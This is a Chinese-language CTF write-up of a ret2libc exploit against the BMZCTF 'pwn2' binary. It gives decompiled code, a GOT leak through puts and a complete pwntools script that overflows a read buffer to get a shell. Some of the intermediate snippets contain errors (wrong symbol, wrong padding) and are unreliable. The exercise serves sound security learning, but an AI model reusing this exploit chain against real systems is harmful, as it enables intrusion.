题目链接：
==
http://www.bmzclub.cn/challenges#pwn2
前言
--

- 从BMZCTF中的一道题复习一下ret2libc

IDA-main：
==
```C
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(*(_QWORD *)&argc, argv, envp);
  bmzctf();
  puts("Welcome to BMZCTF");
  puts("Who are you?");
  if ( check() )
    puts("Only admin can attack me");
  else
    puts("Welcome");
  return 0;
}
```

IDA-check：
--

```c
int check()
{
  char buf; // [rsp+0h] [rbp-30h]

  read(0, &buf, 0x400uLL);
  return strcmp(&buf, "21232F297A57A5A743894A0E4A801FC3");
}
```

Leak-libcbase & system/binsh addr
--
漏洞点应该在check函数里，本题没有gadgets，没有int 80，只有ret2libc一条路了
根据ret2libc的流程，我们需要获取:
	1.**libc基址**
	2.**system str_bin_sh的地址**
看到函数里有puts，就用puts来leak出puts在got表中的位置，计算出libc基址和system str_bin_sh即可
```python
libc_base = leak-libc.dump('puts')
system = libc_base + libc.dump('puts')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
```

现在开始搞基吧...
check函数中buf变量的偏移是0x30，read是0x400所以有很大空间给我们构造payload
```python
payload ="a" * 0x38 +  pop_rdi_ret + elf.got['puts'] + elf.plt['puts'] + main  
```
注意这里要回到main，因为我们leak完要重新走一遍流程
获取基址：
```python
puts_addr = u64(recvuntil('\x7f')[-6::].ljust(8,'\x00'))
```
至于为什么要这样写？大牛们都这么写的。
计算基：
```python
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
```
至此基就搞完了(逃

execute system bin_sh
---
到这里就是基本操作了
```python
payload = ""
payload += "a" * 38
payload += pop_rdi_ret
payload += bin_sh
payload += system
payload += p64(0xdeadbeef)
```

exp
---
```python
from pwn import *

from LibcSearcher import *

proc = process("./pwn2")

elf = ELF("./pwn2")

context.log_level="debug"

padding = "a"*0x30+"b"*8

pop_rdi_ret = 0x400833

mainaddr = 0x40076D

payload = ""

payload += padding

payload += p64(pop_rdi_ret)

payload += p64(elf.got['puts'])

payload += p64(elf.plt['puts'])

payload += p64(mainaddr)

proc.sendlineafter("Who are you?",payload)

_libc_start_main = u64(proc.recvuntil("\x7f")[-6:].ljust(8,"\x00"))

libc = LibcSearcher("puts",_libc_start_main)

libcOffset = _libc_start_main - libc.dump('puts')

system = libcOffset + libc.dump('system') 

_bin_sh = libcOffset + libc.dump('str_bin_sh')

print hex(_libc_start_main-_bin_sh)

payload = ""

payload += padding

payload += p64(pop_rdi_ret)

payload += p64(_bin_sh)

payload += p64(system)

payload += p64(0xdeadbeef)

proc.sendlineafter("Who are you?",payload)

proc.interactive()


```
